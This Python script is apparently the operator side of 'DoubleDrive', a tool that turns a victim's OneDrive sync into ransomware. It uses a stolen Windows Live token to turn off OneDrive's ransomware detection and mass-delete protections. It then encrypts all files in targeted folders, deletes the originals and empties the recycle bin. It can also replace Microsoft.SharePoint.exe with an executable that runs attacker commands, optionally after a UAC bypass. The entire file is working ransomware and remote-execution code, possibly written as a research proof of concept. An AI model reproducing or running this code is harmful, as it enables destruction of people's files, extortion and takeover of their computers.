import json
import argparse
import urllib
import time
import requests
from onedrive_api.onedrive_session import OneDriveSession
from onedrive_api.onedrive_item import OneDriveFileItem
from cryptography.fernet import Fernet
from temp_email import TempEmail
import re
import options


def create_encrypted_contents_from_onedrive_files(onedrive_session: OneDriveSession, onedrive_file_items: list[OneDriveFileItem]) -> dict[str, bytes]:
    key = Fernet.generate_key()
    with open("key.key", "wb") as keyfile:
        keyfile.write(key)

    paths_to_encrypted_contents = {}
    for onedrive_file_item in onedrive_file_items:
        print(f"Encrypting file: {onedrive_file_item.full_path}")
        file_content = onedrive_session.read_file_content(onedrive_file_item)
        file_new_content = Fernet(key).encrypt(file_content)
        paths_to_encrypted_contents[onedrive_file_item.full_path] = file_new_content

    return paths_to_encrypted_contents


def encrypt_onedrive_file_items(onedrive_session: OneDriveSession, paths_to_encrypted_contents: dict[str, bytes]) -> dict[str, bytes]:
    for onedrive_file_path, file_encrypted_content in paths_to_encrypted_contents.items():
        onedrive_item = onedrive_session.get_onedrive_item_by_path(onedrive_file_path)
        onedrive_session.modify_file_content(onedrive_item, file_encrypted_content)


def restore_encrypted_files_without_version_history(onedrive_session: OneDriveSession, paths_to_encrypted_contents: dict[str, bytes]):
    for file_path, encrypted_content in paths_to_encrypted_contents.items():
        print(f"Restoring encrypted file without version history: {file_path}")
        onedrive_session.create_file(f"{file_path}.encrypted", encrypted_content)
    

def save_token_in_cache(drive_id, token):
    with open(f"{drive_id}.cache", "w") as f:
        return f.write(token)
    

def get_token_from_temp_email():
    temp_email = TempEmail(options.TOKEN_DST_EMAIL_ADDRESS)
    messages = temp_email.get_messages()
    last_message = messages[0]
    re_match = re.search("\"https://1drv.ms.*?\"", last_message.content)
    url = re_match.group().replace("\"", "")
    html_text= requests.get(url).text
    search_url = "\"https\\\\u003a\\\\u002f\\\\u002fonedrive.live.com.*?\""
    re_match = re.search(search_url, html_text)
    file_url = re_match.group().replace("\"", "").encode('utf-8').decode('unicode_escape')
    file_url_params = urllib.parse.parse_qs(urllib.parse.urlparse(file_url).query)
    onedrive_file_auth_key = file_url_params["authkey"][0]
    onedrive_file_id = file_url_params["id"][0]
    onedrive_file_drive_id = file_url_params["cid"][0]
    onedrive_session = OneDriveSession()
    windows_live_token = onedrive_session.read_shared_file_content(onedrive_file_drive_id, onedrive_file_id, onedrive_file_auth_key).decode()
    return windows_live_token


def get_args_selected_token(args, onedrive_session):
    token = ""
    if args.use_saved_token:
        with open(args.use_saved_token, "r") as f:
            token = f.read()
    else:
        token = get_token_from_temp_email()
        onedrive_session.login_using_token(token)
        save_token_in_cache(onedrive_session.get_drive_id(), token)

    return token


def remote_ransomware(onedrive_session: OneDriveSession):
    print("Disabling RansomwareDetection and MassDelete features in the target's OneDrive account")
    onedrive_session.patch_user_preferences({"RansomwareDetection": False, "MassDelete": False})

    all_onedrive_files_to_encrypt = []
    for item in options.JUNCTION_NAMES_TO_TARGET_PATHS.keys():
        onedrive_junction_item = onedrive_session.get_onedrive_item_by_path(f"/{item}")
        onedrive_junction_children = onedrive_session.list_children_recursive(onedrive_junction_item)
        items_to_encrypt = [item for item in onedrive_junction_children if isinstance(item, OneDriveFileItem)]
        all_onedrive_files_to_encrypt.extend(items_to_encrypt)


    paths_to_encrypted_contents = create_encrypted_contents_from_onedrive_files(onedrive_session, all_onedrive_files_to_encrypt)
    
    if not options.QUICK_DELETE:
        encrypt_onedrive_file_items(onedrive_session, paths_to_encrypted_contents)
        print("Waiting for the files to update in the target endpoint...")
        time.sleep(10)

    print("Deleting all encrypted files from OneDrive")
    for item in all_onedrive_files_to_encrypt:
        onedrive_session.delete_onedrive_item(item)

    # Wait enough time for the files to move into the recycle bin
    print("Waiting for the deleted files to move into the recycle bin...")
    time.sleep(10)
    print("Emptying recycle bin")
    onedrive_session.empty_recycle_bin()

    restore_encrypted_files_without_version_history(onedrive_session, paths_to_encrypted_contents)


def parse_args():
    parser = argparse.ArgumentParser(description="DoubleDrive - Turns the original OneDrive.exe into a ransomware")
    parser.add_argument("--remote-ransomware", help="If specified, encrypts all the remote files under the directories that were targeted with options_setup.py", action="store_true")
    parser.add_argument("--replace-sharepoint", help="If specified, replaces Microsoft.SharePoint.exe which is part of OneDrive's binaries with an executable that executes attacker's commands", action="store_true")
    parser.add_argument("--use-saved-token", help="Path to a file that contains a Windows ID Live token to use")

    parser.add_argument("--run-command", help="A command to pass to the malicious executable that replaces SharePoint's executable on the endpoint")
    parser.add_argument("--command-uac-bypass", help="If specified, first bypasses UAC on the target and then runs the command given in --run-command", action="store_true")
    args = parser.parse_args()
    
    if args.command_uac_bypass and not args.run_command:
        parser.error("--command-uac-bypass cannot be used without --run-command")

    return args


def main():
    args = parse_args()
    onedrive_session = OneDriveSession()
    token = get_args_selected_token(args, onedrive_session)
    onedrive_session.login_using_token(token)
    save_token_in_cache(onedrive_session.get_drive_id(), onedrive_session.get_token())

    if args.replace_sharepoint:
        with open("./dist/follow_attacker_commands.exe", "rb") as f:
            malicious_exe = f.read()
        sharepoint_exe_onedrive_item = onedrive_session.get_onedrive_item_by_path(f"/{options.ONEDRIVE_VERSION_FOLDER_JUNCTION_NAME}/Microsoft.SharePoint.exe")
        onedrive_session.modify_file_content(sharepoint_exe_onedrive_item, malicious_exe)
    
    if args.run_command:
        cmd_dict = {
            "uac": args.command_uac_bypass,
            "command": args.run_command
        }
        onedrive_session.create_file(f"/{options.CMD_FILE_NAME}", json.dumps(cmd_dict).encode(), modify_if_exists=True)

    if args.remote_ransomware:
        remote_ransomware(onedrive_session)

    


if "__main__" == __name__:
    main()